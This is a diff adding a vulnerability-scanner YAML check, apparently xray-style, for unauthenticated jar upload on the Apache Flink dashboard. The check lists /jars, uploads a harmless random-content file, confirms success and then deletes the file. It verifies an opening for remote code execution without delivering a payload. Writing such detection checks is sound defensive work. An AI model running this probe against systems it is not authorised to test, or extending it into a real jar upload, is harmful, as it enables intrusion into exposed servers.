@@ -1,0 +1,42 @@
+name: poc-yaml-apache-flink-upload-rce
+set:
+    r1: {"function": "randomLowercase", "vars": "8"}
+    r2: {"function": "randomLowercase", "vars": "4"}
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /jars
+            follow_redirects: true
+        expression_json: [{"function": "checkStatusCode", "vars": "200"}, "and", {"function": "checkRespFromContentTypeByre", "vars": "json"}, "and", {"function": "checkRespFromText", "vars": "address"}, "and", {"function": "checkRespFromText", "vars": "files"}]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /jars/upload
+            headers:
+                Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+            body: "\
+                --8ce4b16b22b58894aa86c421e8759df3\r\n\
+                Content-Disposition: form-data; name=\"jarfile\";filename=\"{{r2}}.jar\"\r\n\
+                Content-Type:application/octet-stream\r\n\
+                \r\n\
+                {{r1}}\r\n\
+                --8ce4b16b22b58894aa86c421e8759df3--\r\n\
+                "
+            follow_redirects: true
+        expression_json: [{"function": "checkStatusCode", "vars": "200"}, "and", {"function": "checkRespFromContentTypeByre", "vars": "json"}, "and", {"function": "checkRespFromText", "vars": "success"}, "and", {"function": "checkRespFromText", "vars": "{{r2}}"}]
+        output: [{"function": "searchRespByText", "vars": "(?P<filen>[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}_[a-z]{4}.jar)", "orders": ["filen"]}]
+    r2:
+        request:
+            cache: true
+            method: DELETE
+            path: /jars/{{filen}}
+            follow_redirects: true
+        expression_json: [{"function": "checkStatusCode", "vars": "200"}]
+expression: r0() && r1() && r2()
+detail:
+    author: timwhite
+    links:
+        - https://github.com/LandGrey/flink-unauth-rce
